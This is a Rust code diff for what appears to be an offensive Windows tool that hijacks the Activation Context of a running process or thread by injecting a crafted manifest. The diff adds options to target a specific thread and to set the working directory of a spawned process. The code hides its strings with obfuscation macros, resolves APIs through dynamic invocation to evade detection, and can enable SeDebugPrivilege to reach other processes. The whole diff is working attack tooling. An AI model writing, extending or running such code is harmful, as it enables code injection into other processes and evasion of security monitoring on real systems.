@@ -90,6 +90,8 @@ fn main()
     opts.optopt("f", &lc!("manifest-file"), &lc!("Path to the manifest file from which the new Activation Context is created."), "");
     opts.optopt("r", &lc!("resource-number"), &lc!("Resource index of the current executable where the manifest is located."), "");
     opts.optopt("p", &lc!("pid"), &lc!("PID of the process whose Activation Context is to be hijacked."), "");
+    opts.optopt("t", &lc!("tid"), &lc!("TID of the thread whose Activation Context is to be hijacked (0 means hijack process main AC)."), "");
+    opts.optopt("c", &lc!("current-directory"), &lc!("Set current directory for the new process."), "");
     opts.optflag("n", &lc!("new-console"), &lc!("Set CREATE_NEW_CONSOLE flag to spawn the new process."));
     opts.optflag("d", &lc!("debug"), &lc!("Enable SeDebugPrivilege to interact with the remote process."));
 
@@ -118,6 +120,8 @@ fn main()
     let pid;
     let mut new_console = false;
     let mut enable_debug = false;
+    let mut current_directory: Option<String> = None;
+    let mut thread_id: Option<u32> = None;
 
     if matches.opt_present("r") {
         resource_index = matches.opt_str("r").unwrap().parse().unwrap();
@@ -136,8 +140,13 @@ fn main()
             new_console = true;
         }
 
+        if matches.opt_present("c") {
+            let dir = matches.opt_str("c").unwrap();
+            current_directory = Some(dir);
+        }
+
         binary_path = matches.opt_str("b").unwrap();
-        spawn_new_process(binary_path, resource_index, manifest_path, new_console);
+        spawn_new_process(binary_path, resource_index, manifest_path, new_console, current_directory);
     } 
     else if mode == lc!("hijack") 
     {
@@ -152,14 +161,19 @@ fn main()
             enable_debug = true;
         }
 
-        hijack_process_or_thread(pid, resource_index, manifest_path, enable_debug);
+        if matches.opt_present("t") {
+            let tid: u32 = matches.opt_str("t").unwrap().parse().unwrap();
+            thread_id = Some(tid);
+        }
+
+        hijack_process_or_thread(pid, resource_index, manifest_path, enable_debug, thread_id);
     } 
     else {
         print_usage(&program, opts);
     }
 }
 
-fn spawn_new_process(binary_path: String, resource_index: u32, manifest_path: String, new_console: bool) 
+fn spawn_new_process(binary_path: String, resource_index: u32, manifest_path: String, new_console: bool, current_directory: Option<String>) 
 {
     unsafe 
     {
@@ -248,6 +262,15 @@ fn spawn_new_process(binary_path: String, resource_index: u32, manifest_path: St
             creation_flags |= 0x00000010; // CREATE_NEW_CONSOLE
         }
 
+        let mut current_dir: *const u16 = ptr::null();
+        let mut current: Vec<u16>; 
+
+        if let Some(current_path) = current_directory {
+            current = current_path.encode_utf16().collect();
+            current.push(0);
+            current_dir = current.as_ptr();
+        }
+
         let mut process_info: PROCESS_INFORMATION = std::mem::zeroed() ;
         let function: CreateProcessW;
         let ret: Option<bool>;
@@ -263,7 +286,7 @@ fn spawn_new_process(binary_path: String, resource_index: u32, manifest_path: St
             false,
             creation_flags, // Suspended
             ptr::null_mut(),
-            ptr::null(),
+            current_dir, 
             &mut startup_info,
             &mut process_info
          );
@@ -370,7 +393,7 @@ fn hijack_process(process_handle: HANDLE, thread_handle: HANDLE, ac_struct_ptr: 
     }
 }
 
-fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String, enable_debug: bool) 
+fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String, enable_debug: bool, thread_id: Option<u32>) 
 {
     unsafe 
     {   
@@ -467,13 +490,18 @@ fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String
         let dst = dst_buffer.as_mut_ptr();
         copy_nonoverlapping(src, dst, dwsize);
 
-        println!("{}", &lc!("[-] Looking for the remote process main thread..."));
-
-        let tid = get_main_thread_id(pid);
+        let tid;
+        if let Some(th_id) = thread_id {
+            tid = th_id;
+        } else {
+            tid = get_main_thread_id(pid);
+            if tid == 0 {
+                println!("{}", &lc!("[x] Main thread not found. Fallback to process main Activation Context hijack."));
+            }
+        }
+         
         if tid == 0 
         {
-            println!("{}", &lc!("[x] Main thread not found. Fallback to process main Activation Context hijack."));
-
             let h = HANDLE::default();
             let handle_ptr: *mut HANDLE = std::mem::transmute(&h);
             let o = OBJECT_ATTRIBUTES::default();
@@ -494,6 +522,7 @@ fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String
             }
 
             hijack_process(*handle_ptr, HANDLE::default(), dst, dwsize, false);
+            return;
         }
 
         println!("{} {}.", &lc!("[+] Main thread detected. TID:"), tid);
@@ -571,12 +600,10 @@ fn hijack_process_or_thread(pid: u32, resource_index: u32, manifest_path: String
         } 
 
         if (*teb_ptr).ActivationStack.ActiveFrame == ptr::null_mut() { // Main thread doesn't have a custom AC, meaning we can hijack the process' main AC
-            println!("\t\\{}", &lc!("[!] Main thread does not have a custom AC enabled. Hijacking main AC of the process."));
-            hijack_process(*process_handle_ptr, HANDLE::default(), dst, dwsize, false);
-            return;
+            println!("\t\\{}", &lc!("[!] Main thread does not have a custom AC enabled."));
+        } else {
+            println!("\t\\{}", &lc!("[!] Main thread has a custom AC enabled. Hijacking thread's AC stack."));
         }
-
-        println!("\t\\{}", &lc!("[!] Main thread has a custom AC enabled. Hijacking thread's AC stack."));
 
         let ba = usize::default();
         let base_address: *mut PVOID = std::mem::transmute(&ba);
@@ -663,6 +690,8 @@ fn get_main_thread_id(pid: u32) -> u32
 {
     unsafe
     {
+        println!("{}", &lc!("[-] Looking for the remote process main thread..."));
+
         let func: dinvoke_rs::data::CreateToolhelp32Snapshot;
         let ret: Option<HANDLE>;
         let k32 = dinvoke_rs::dinvoke::get_module_base_address(&lc!("kernel32.dll"));
